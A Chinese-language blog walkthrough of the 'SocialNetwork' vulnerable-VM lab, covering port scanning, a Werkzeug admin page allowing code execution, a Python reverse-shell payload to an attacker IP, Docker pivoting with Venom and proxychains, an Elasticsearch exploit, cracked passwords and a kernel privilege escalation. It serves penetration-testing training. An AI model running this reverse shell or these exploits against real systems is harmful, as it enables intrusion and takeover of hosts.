# 打靶-SocialNetwork

<div class="has-toc have-toc">
</div>

## 0x00 准备工作

中等难度的靶机，Description如下：

```
Leave a message is a new anonymous social networking site where users can post messages for each other. They've assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though.
```

直接装在vmware上即可。

## 0x01 正式打靶

上nmap扫描主机的端口，发现开放了22和5000。<figure class="wp-block-image size-full">

<img loading="lazy" width="1475" height="456" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-15.png" alt="" class="wp-image-3957" /> </figure> 

再深入扫描一下服务，发现5000端口使用了Werkzeug。<figure class="wp-block-image size-full">

<img loading="lazy" width="1914" height="571" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-16.png" alt="" class="wp-image-3958" /> </figure> 

baidu一下，发现Werkzeug是作为一个Python Web框架的底层库。<figure class="wp-block-image size-full">

<img loading="lazy" width="1693" height="174" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-17.png" alt="" class="wp-image-3959" /> </figure> 

访问下5000端口，发现存在一个留言板。<figure class="wp-block-image size-full">

<img loading="lazy" width="2269" height="656" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-18.png" alt="" class="wp-image-3960" /> </figure> 

使用dirsearch来进行路径发现，发现存在一个隐藏的admin路径，接下来访问它。<figure class="wp-block-image size-full">

<img loading="lazy" width="1784" height="584" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-19.png" alt="" class="wp-image-3961" /> </figure> 

好家伙，这个页面可以直接进行代码执行。<figure class="wp-block-image size-full">

<img loading="lazy" width="1688" height="788" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-20.png" alt="" class="wp-image-3962" /> </figure> 

这里插一个小细节，之前扫描出web服务的编程语言是python，所以这里可以通过python的代码执行来反弹shell。<figure class="wp-block-image size-full">

<img loading="lazy" width="1852" height="220" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-21.png" alt="" class="wp-image-3963" /> </figure> 

应用的代码如下：

<pre class="wp-block-code"><code>import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.92.129",2333))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(&#91;"/bin/bash","-i"])</code></pre>

本地开2333端口侦听，执行id命令后，能看到是root用户，不过当前目录下的dockerfile很可疑，可能进入的系统是docker容器的系统。<figure class="wp-block-image size-full">

<img loading="lazy" width="1916" height="458" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-22.png" alt="" class="wp-image-3964" /> </figure> 

确定进入的系统是否为docker系统的方法：

  1. `ls /.dockerenv`，查看根目录下是否存在有.dockerenv文件
  2. `cat /proc/1/cgroup` ，1代表初始化进程的id，当它的cgroup文件中包含docker文件的映像信息和哈希值，就100%确定工作在docker环境<figure class="wp-block-image size-full">

<img loading="lazy" width="2028" height="532" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-23.png" alt="" class="wp-image-3965" /> </figure> 

查看当前ip，然后在内网进行主机发现，当前172.17.0.2/16是b段，全部ping的话，主机数目过多。<figure class="wp-block-image size-full">

<img loading="lazy" width="1714" height="368" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-25.png" alt="" class="wp-image-3967" /> </figure> 

这里利用一个小脚本`for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done`，可以看到1-3主机是存活的。<figure class="wp-block-image size-full">

<img loading="lazy" width="1347" height="1292" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-26.png" alt="" class="wp-image-3968" /> </figure> 

然后使用Venom工具，`./admin_linux_x64 -lport 8888`，侦听8888端口，再用`python3 -m http.server 80`开启web服务，用靶机wget下载agent\_linux\_x64。<figure class="wp-block-image size-full">

<img loading="lazy" width="1835" height="647" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-27.png" alt="" class="wp-image-3969" /> </figure> 

kali上面会得到结点响应，再开启socks5代理。<figure class="wp-block-image size-full">

<img loading="lazy" width="1373" height="729" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-28.png" alt="" class="wp-image-3970" /> </figure> 

使用`proxychains nmap -sT -Pn 172.17.0.1`,扫描172.17.0.1的端口。<figure class="wp-block-image size-full">

<img loading="lazy" width="1149" height="521" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-29.png" alt="" class="wp-image-3971" /> </figure> 

再次详细扫描`proxychains nmap -p22,5000 -sV -sT -Pn 172.17.0.1`，不能说是一模一样，只能说是完全一致。<figure class="wp-block-image size-full">

<img loading="lazy" width="1791" height="426" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-30.png" alt="" class="wp-image-3972" /> </figure> 

然后在浏览器部署代理后访问页面。<figure class="wp-block-image size-full">

<img loading="lazy" width="1099" height="312" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-31.png" alt="" class="wp-image-3973" /> </figure> 

似曾相识燕归来，根据他们相同的内容，可以做出判断，这所谓的两台主机其实是同一台主机，只不过一个对应内网ip，一个对应外网ip。<figure class="wp-block-image size-full">

<img loading="lazy" width="1531" height="542" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-32.png" alt="" class="wp-image-3974" /> </figure> 

好了，下面就朝着172.17.0.3猛攻，扫描它的端口。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-33.png" alt="" class="wp-image-3976" width="471" height="149" /> </figure> 

开启了9200端口，在详细扫描一下，可以发现是Elasticsearch服务。<figure class="wp-block-image size-full">

<img loading="lazy" width="2024" height="769" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-34.png" alt="" class="wp-image-3977" /> </figure> 

web访问，得到版本信息。<figure class="wp-block-image size-full">

<img loading="lazy" width="1397" height="674" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-35.png" alt="" class="wp-image-3978" /> </figure> 

利用`searchsploit elasticsearch`找一下历史漏洞。<figure class="wp-block-image size-full">

<img loading="lazy" width="2201" height="524" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-36.png" alt="" class="wp-image-3979" /> </figure> 

使用`cp /usr/share/exploitdb/exploits/linux/remote/36337.py .`拷贝到当前目录下，简单查看下代码。<figure class="wp-block-image size-full">

<img loading="lazy" width="1811" height="665" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-37.png" alt="" class="wp-image-3981" /> </figure> 

使用`proxychains python2 36337.py 172.17.0.3`来getshell，发现获取到的还是root权限。<figure class="wp-block-image size-full">

<img loading="lazy" width="1868" height="508" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-38.png" alt="" class="wp-image-3982" /> </figure> 

在当前目录查看，发现一个passwords文件，查看一下。<figure class="wp-block-image size-full">

<img loading="lazy" width="1225" height="966" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-39.png" alt="" class="wp-image-3983" /> </figure> 

文件的格式貌似是用户名和密码的哈希值，在线解密汇总。

<pre class="wp-block-code"><code>john:1337hack
test:1234test
admin:1111pass
root:1234pass
jane:1234jane</code></pre>

经过尝试ssh连接，只有john用户可以登录到192.168.92.134上。<figure class="wp-block-image size-full">

<img loading="lazy" width="1537" height="888" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-40.png" alt="" class="wp-image-3985" /> </figure> 

查看john的权限，发现并不能够直接sudo。<figure class="wp-block-image size-full">

<img loading="lazy" width="1239" height="103" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-41.png" alt="" class="wp-image-3986" /> </figure> 

下面尝试本地提权，最主要的一种方法是通过内核漏洞提权，查看下当前的版本。<figure class="wp-block-image size-full">

<img loading="lazy" width="1997" height="73" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-42.png" alt="" class="wp-image-3987" /> </figure> 

再利用searchsploit查找下。<figure class="wp-block-image size-full">

<img loading="lazy" width="2070" height="304" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-43.png" alt="" class="wp-image-3988" /> </figure> 

拷贝到当前目录，`cp /usr/share/exploitdb/exploits/linux/local/37292.c .`，这个明显是c语言写的，但是靶机上运行不了gcc，无法编译。<figure class="wp-block-image size-full">

<img loading="lazy" width="2209" height="73" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-44.png" alt="" class="wp-image-3989" /> </figure> 

阅读代码发现，代码运行中会再次调用gcc命令将.c文件编译成.so文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="1478" height="541" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-45.png" alt="" class="wp-image-3990" /> </figure> 

对源代码进行修改，删除掉143-147行内容。<figure class="wp-block-image size-full">

<img loading="lazy" width="2818" height="299" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-46.png" alt="" class="wp-image-3991" /> </figure> 

使用`gcc -o exp 37292.c`进行编译，编译过程中会报错，但是并不影响。<figure class="wp-block-image size-full">

<img loading="lazy" width="2268" height="553" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-47.png" alt="" class="wp-image-3992" /> </figure> 

使用locate命令用于查找符合条件的文件，同样拷贝到当前目录下，再用python启动web服务。<figure class="wp-block-image size-full">

<img loading="lazy" width="2272" height="210" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-48.png" alt="" class="wp-image-3993" /> </figure> 

用靶机wget下载exp和ofs-lib.so。<figure class="wp-block-image size-full">

<img loading="lazy" width="1204" height="811" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-49.png" alt="" class="wp-image-3994" /> </figure> 

然后把两个文件移到tmp文件夹，再修改exp的权限后执行。<figure class="wp-block-image size-full">

<img loading="lazy" width="594" height="509" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-50.png" alt="" class="wp-image-3995" /> </figure> 

最后，提权成功！<figure class="wp-block-image size-full">

<img loading="lazy" width="946" height="134" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-51.png" alt="" class="wp-image-3996" /> </figure>
